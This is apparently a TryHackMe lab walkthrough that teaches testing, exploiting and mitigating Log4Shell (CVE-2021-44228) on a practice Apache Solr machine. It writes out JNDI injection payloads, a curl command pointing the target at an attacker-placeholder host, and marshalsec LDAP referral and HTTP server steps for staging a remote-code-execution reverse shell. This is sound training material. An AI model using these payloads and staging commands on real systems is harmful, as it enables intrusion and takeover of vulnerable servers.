On December 9th, 2021, the world was made aware of a new vulnerability identified as CVE-2021-44228, affecting the Java logging package log4j. This vulnerability earned a severity score of 10.0 (the most critical designation) and offers remote code trivial remote code execution on hosts engaging with software that utilizes this log4j version. This attack has been dubbed "Log4Shell"

Today, log4j version 2.16.0 is available and patches this vulnerability (JNDI is fully disabled, support for Message Lookups is removed, and the new DoS vulnerability CVE-2021-45046 is not present). https://github.com/apache/logging-log4j2/releases/tag/rel%2F2.16.0

However, the sheer danger of this vulnerability is due to how ubiquitous the logging package is. Millions of applications as well as software providers use this package as a dependency in their own code. While you may be able to patch your own codebase using log4j, other vendors and manufacturers will still need to push their own security updates downstream. Many security researchers have likened this vulnerability to that of Shellshock by the nature of its enormous attack surface. We will see this vulnerability for years to come.

For a growing community-supported list of software and services vulnerable to CVE-2021-44228, check out this GitHub repository:

    https://github.com/YfryTchsGD/Log4jAttackSurface

This room will showcase how you can test for, exploit, and mitigate this vulnerability within Log4j.

While there are a number of other articles, blogs, resources and learning material surrounding CVE-2021-44228, I (the author of this exercise) am particularly partial to these: 

    https://www.huntress.com/blog/rapid-response-critical-rce-vulnerability-is-affecting-java
    https://log4shell.huntress.com/
    https://www.youtube.com/watch?v=7qoPDq41xhQ

Note from the author:

Please use the information you learn in this room to better the security landscape. Test systems you own, apply patches and mitigations where appropriate, and help the whole industry recover. This is a very current and real-world threat -- whether you are a penetration tester, red teamer, incident responder, security analyst, blue team member, or what have you -- this exercise is to help you and the world understand and gain awareness on this widespread vulnerability. It should not be used for exploitative gain or self-serving financial incentive (I'm looking at you, beg bounty hunters)

Additionally, please bear in mind that the developers of the log4j package work on the open source project as a labor of love and passion. They are volunteer developers that maintain their project in their spare time. There should be absolutely no bashing, shame, or malice towards those individuals. As with all things, please further your knowledge so you can be a pedestal and pillar for the information security community. Educate, share, and help.



The target virtual machine includes software that utilizes this vulnerable log4j package, offering you a playground to explore the vulnerability.

After deploying your virtual machine, you should find that the IP address (accessible within the TryHackMe VPN or through the provided AttackBox) is 10.10.253.236.

To begin, start with basic reconnaissance to understand what ports are open on this machine. This is best done within a Linux distribution, like Kali Linux, ParrotOS, Black Arch (or any other flavor of your choosing) with the nmap command-line tool:
Run a basic nmap scan against vulnerable machine

           
attackbox@tryhackme$ nmap -v 10.10.253.236

        

The application present on this target specifically uses ports that may not be immediately noticed by nmap. For the "whole picture perspective," scan all ports like so:
Scan all ports on machine via nmap

           
attackbox@tryhackme$ nmap -v -p- 10.10.253.236

![image](https://user-images.githubusercontent.com/95479102/146311863-49cfb618-2247-4e99-b8d2-1f8d069acbf9.png)

This target machine is running Apache Solr 8.11.0, one example of software that is known to include this vulnerable log4j package. For the sake of showcasing this vulnerability, the application runs on Java 1.8.0_181.

Explore the web interface accessible at http://10.10.253.236:8983 and click around to get a feel for the application. For more detail on Apache Solr, please refer to their official website. https://solr.apache.org/

This instance of Apache Solr is provisioned with no data whatsoever. It is a flat, vanilla, and absolutely minimum installation -- yet at its core it is still vulnerable to this CVE-2021-44228. 

![image](https://user-images.githubusercontent.com/95479102/146311938-2e619690-57ec-4ca1-a7ae-591b40ac5e5b.png)

![image](https://user-images.githubusercontent.com/95479102/146314634-026fa0b1-7f23-4d08-867c-81cfdd51bc0d.png)

![image](https://user-images.githubusercontent.com/95479102/146316131-91683424-64f6-4e01-bd17-743dfd34850f.png)



Note that the URL endpoint that you have just uncovered needs to be prefaced with the solr/ prefix when viewing it from the web interface. This means that you should visit:

http://10.10.253.236:8983/solr/admin/cores

You also noticed that params seems to be included in the log file. At this point, you may already be beginning to see the attack vector.

The log4j package adds extra logic to logs by "parsing" entries, ultimately to enrich the data -- but may additionally take actions and even evaluate code based off the entry data. This is the gist of CVE-2021-44228. Other syntax might be in fact executed just as it is entered into log files. 

Some examples of this syntax are:

    ${sys:os.name}
    ${sys:user.name}
    ${log4j:configParentLocation}
    ${ENV:PATH}
    ${ENV:HOSTNAME}
    ${java:version}

You may already know the general payload to abuse this log4j vulnerability. The format of the usual syntax that takes advantage of this looks like so:

${jndi:ldap://ATTACKERCONTROLLEDHOST}

This syntax indicates that the log4j will invoke functionality from "JNDI", or the "Java Naming and Directory Interface." Ultimately, this can be used to access external resources, or "references," which is what is weaponized in this attack. 

Notice the ldap:// schema. This indicates that the target will reach out to an endpoint (an attacker controlled location, in the case of this attack) via the LDAP protocol. For the sake of brevity, we will not need to cover all the ins-and-outs and details of LDAP here, but know that this is something we will need to work with as we refine our attack.

For now, know that the target will in fact make a connection to an external location. This is indicated by the ATTACKERCONTROLLEDHOST placeholder in the above syntax. You, acting as the attacker in this scenario, can host a simple listener to view this connection.

The next question is, where could we enter this syntax?

Anywhere that has data logged by the application.

This is the crux of this vulnerability. Unfortunately, it is very hard to determine where the attack surface is for different applications, and ergo, what applications are in fact vulnerable. Simply seeing the presence of log4j files doesn't clue in on the exact version number, or even where or how the application might use the package.

Think back to the previous task. You already discovered that you could supply params to the /solr/admin/cores URL, and now that you have a better understanding of how log4j works, you should understand that this is where you supply your inject syntax. You can simply supply HTTP GET variables or parameters which will then processed and parsed by log4j. All it takes is this single line of text -- and that makes this vulnerability extremely easy to exploit.

Other locations you might supply this JNDI syntax:

    Input boxes, user and password login forms, data entry points within applications
    HTTP headers such as User-Agent, X-Forwarded-For, or other customizable headers
    Any place for user-supplied data

If you would like more information on this JNDI attack vector, please review this Black Hat USA presentation from 2016.

https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf

curl 'http://10.10.253.236:8983/solr/admin/cores?foo=$\{jndi:ldap://YOUR.ATTACKER.IP.ADDRESS:9999\}'

![image](https://user-images.githubusercontent.com/95479102/146321410-c46cd0f1-26c2-47f6-8655-f70ff50b7618.png)



At this point, you have verified the target is in fact vulnerable by seeing this connection caught in your netcat listener. However, it made an LDAP request... so all your netcat listener may have seen was non-printable characters (strange looking bytes). We can now build upon this foundation to respond with a real LDAP handler.

We will utilize a open-source and public utility to stage an "LDAP Referral Server". This will be used to essentially redirect the initial request of the victim to another location, where you can host a secondary payload that will ultimately run code on the target. This breaks down like so:

    ${jndi:ldap://attackerserver:1389/Resource} -> reaches out to our LDAP Referral Server
    LDAP Referral Server springboards the request to a secondary http://attackerserver/resource
    The victim retrieves and executes the code present in http://attackerserver/resource

This means we will need an HTTP server, which we could simply host with any of the following options (serving on port 8000):

    python3 -m http.server
    php -S 0.0.0.0:8000
    (or any other busybox httpd or formal web service you might like)

If you get stuck on any of the following steps, we have a video showcasing (using the AttackBox) each step to gain remote code execution: https://youtu.be/OJRqyCHheRE


The first order of business however is obtaining the LDAP Referral Server. We will use the marshalsec utility offered at https://github.com/mbechler/marshalsec

![image](https://user-images.githubusercontent.com/95479102/146742247-ac5c9d8a-658e-4a0a-8f6f-b2167f8f05db.png)

Ultimately, this needs to run Java. Reviewing the README for this utility, it suggests using Java 8. (You may or may not have success using a different version, but to "play by the rules," we will match the same version of Java used on the target virtual machine)

If you are using the TryHackMe AttackBox, you do NOT need to follow the below steps - move onto the next question.
See steps to installing Java 8 locally (follow only if not using AttackBox)

If you are not running 1.8.0_181 within the attack box, you can review the update-alternatives --set steps below to switch to this Java 8 version.

If you are using your own attacking machine connected to the VPN, you may need to download and install Java 1.8.0_181 with the steps below:

You can find a mirror of different Java versions to run on Linux at this location. http://mirrors.rootpei.com/jdk/

Select the jdk-8u181-linux-x64.tar.gz package (or alternatively, download the file attached to this task, added for your convenience).

Download this into your attacking machine, and run the following commands to configure your system to use this Java version by default (adjust the download filesystem path as appropriate):

sudo mkdir /usr/lib/jvm 

cd /usr/lib/jvm

sudo tar xzvf ~/Downloads/jdk-8u181-linux-x64.tar.gz    # modify as needed

sudo update-alternatives --install "/usr/bin/java" "java" "/usr/lib/jvm/jdk1.8.0_181/bin/java" 1
sudo update-alternatives --install "/usr/bin/javac" "javac" "/usr/lib/jvm/jdk1.8.0_181/bin/javac" 1
sudo update-alternatives --install "/usr/bin/javaws" "javaws" "/usr/lib/jvm/jdk1.8.0_181/bin/javaws" 1

sudo update-alternatives --set java /usr/lib/jvm/jdk1.8.0_181/bin/java
sudo update-alternatives --set javac /usr/lib/jvm/jdk1.8.0_181/bin/javac
sudo update-alternatives --set javaws /usr/lib/jvm/jdk1.8.0_181/bin/javaws

![image](https://user-images.githubusercontent.com/95479102/146745208-681b50f5-2f77-419f-80de-c12190124dd5.png)

After you have downloaded, extracted, and set the appropriate filesystem settings (the update-alternatives syntax) above, you should be able to run java -version and verify you are in fact now running Java 1.8.0_181.

![image](https://user-images.githubusercontent.com/95479102/146748070-4500f33f-22c0-4198-85a8-ae1f39343911.png)

We must build marshalsec with the Java builder maven. If you do not yet have maven on your system, you can install it through your package manager (not needed if you're using the AttackBox): sudo apt install maven

Next, run the command to build the marshalsec utility:

![image](https://user-images.githubusercontent.com/95479102/146745721-6514afec-ec20-4012-ad71-5de69107f717.png)

![image](https://user-images.githubusercontent.com/95479102/146746033-b000e687-7d3d-4d4a-a01e-86a50b65a010.png)

With the marshalsec utility built, we can start an LDAP referral server to direct connections to our secondary HTTP server (which we will prepare in just a moment). You are more than welcome to dig into the usage, parameters and other settings that can be configured with this tool -- but for the sake of demonstration, the syntax to start the LDAP server is as follows:

java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"

Now that our LDAP server is ready and waiting, we can open a second terminal window to prepare and our final payload and secondary HTTP server.

Ultimately, the log4j vulnerability will execute arbitrary code that you craft within the Java programming language. If you aren't familiar with Java, don't fret -- we will use simple syntax that simply "shells out" to running a system command. In fact, we will retrieve a reverse-shell connection so we can gain control over the target machine!

Create and move into a new directory where you might host this payload. First, create your payload in a text editor of your choice (mousepad, nano, vim, Sublime Text, VS Code, whatever), with the specific name Exploit.java:

![image](https://user-images.githubusercontent.com/95479102/146746718-74d29e4f-b6ff-4e9e-9b86-8ca3a3b7caf3.png)


